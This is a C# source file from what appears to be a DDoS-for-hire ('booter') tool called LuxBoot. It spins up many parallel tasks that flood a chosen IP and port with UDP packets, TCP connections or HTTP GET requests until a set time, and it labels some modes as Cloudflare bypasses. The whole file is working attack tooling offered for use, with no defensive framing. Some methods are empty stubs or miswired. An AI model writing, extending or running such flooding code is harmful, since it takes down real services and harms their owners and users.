using LuxBoot.Models;
using Microsoft.AspNetCore.Http;
using System.Net;
using System.Net.Sockets;
using System.Text;


namespace LuxBoot.DOS_Servers
{
    public class Servers
    {
        private Attack_Methods _method;
        
        public Servers(Attack_Methods method)
        {
            _method = method;
        }

        

        public async Task Start(string method, AttackItem _item)
        {
            if (_item == null)
            {
                return;
            }
            if(method.ToLower() == "udp")
            {
                for (int i = 0; i < 100; i++) {
                    Task.Run(() => { _method.UDP_FLOOD(_item).GetAwaiter().GetResult(); });
                }
            }
            if (method.ToLower() == "tcp")
            {
                for (int i = 0; i < 70; i++)
                {
                    Task.Run(() => { _method.TCP_ACK(_item).GetAwaiter().GetResult(); });
                }
            }
            if (method.ToLower() == "syn")
            {
                for (int i = 0; i < 100; i++)
                {
                    Task.Run(() => { _method.TCP_ACK(_item).GetAwaiter().GetResult(); });
                }
            }
            if (method.ToLower() == "hget")
            {
                for (int i = 0; i < 100; i++)
                {
                    Task.Run(() => { _method.HTTP_GET(_item).GetAwaiter().GetResult(); });
                }
            }

            if (method.ToLower() == "hsget")
            {
                for (int i = 0; i < 100; i++)
                {
                    Task.Run(() => { _method.HTTP_GET(_item).GetAwaiter().GetResult(); });
                }
            }

            if (method.ToLower() == "uflood")
            {
                for (int i = 0; i < 100; i++)
                {
                    Task.Run(() => { _method.UDP_FLOOD(_item).GetAwaiter().GetResult(); });
                }
            }
            if (method.ToLower() == "cfbypass")
            {
                for (int i = 0; i < 100; i++)
                {
                    Task.Run(() => { _method.HTTP_GET(_item).GetAwaiter().GetResult(); });
                }
            }

        }
    }

    public class Attack_Methods
    {
        public async Task UDP_ACK(AttackItem item)
        {
            UdpClient client = new UdpClient();
            IPAddress address = IPAddress.Parse(item.IpAddress);

            IPEndPoint endpoint = new IPEndPoint(address, int.Parse(item.Port));
            
            while(DateTime.UtcNow < DateTime.Parse(item.TimeLeft))
            {
                client.Connect(endpoint);
                var data_2 = "\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a";

                client.Send(Encoding.UTF8.GetBytes(data_2), data_2.Length, endpoint);
                client.Send(Encoding.UTF8.GetBytes(data_2), data_2.Length, endpoint);

                client.Close();

            }
        }

        public async Task TCP_ACK(AttackItem item)
        {
            TcpClient client = new TcpClient();
            IPAddress add = IPAddress.Parse(item.IpAddress);

            while(DateTime.Now < DateTime.Parse(item.TimeLeft))
            {
                for (int i = 0; i < 10; i++)
                {
                    Task.Run(async () =>
                    {
                        client.Connect(add, int.Parse(item.Port));

                        var data_2 = "\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a";


                        var c = client.GetStream();

                        var en = Encoding.UTF8.GetBytes(data_2);
                        await c.WriteAsync(en);

                        c.Close();
                        client.Close();
                    });

                }
            }
        }
        public async Task SYN_ACK(AttackItem item)
        {

        }

        public async Task HTTP_GET(AttackItem item)
        {
            HttpClient c = new HttpClient();

            c.DefaultRequestHeaders.Add("Accept", "application/json");
            c.DefaultRequestHeaders.Add("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1");

            while(DateTime.Now < DateTime.Parse(item.TimeLeft))
            {
                var response = await c.GetAsync(item.IpAddress);

                response.Content.ReadAsStreamAsync().Wait();
                response.Dispose();
            }

            c.Dispose();
            


        }
        public async Task UDP_FLOOD(AttackItem item)
        {
            UdpClient client = new UdpClient();
            IPAddress address = IPAddress.Parse(item.IpAddress);

            IPEndPoint endpoint = new IPEndPoint(address, int.Parse(item.Port));

            while (DateTime.UtcNow < DateTime.Parse(item.TimeLeft))
            {
                var data = "😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂";
                var data_2 = "\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a\U0001f97a";

                client.Send(Encoding.UTF8.GetBytes(data), data.Length, endpoint);
                client.Send(Encoding.UTF8.GetBytes(data_2), data_2.Length, endpoint);
            }

        }

        public async Task CLOUDFLARE_BYPASS(AttackItem item)
        {
            // on works
        }
    }

}
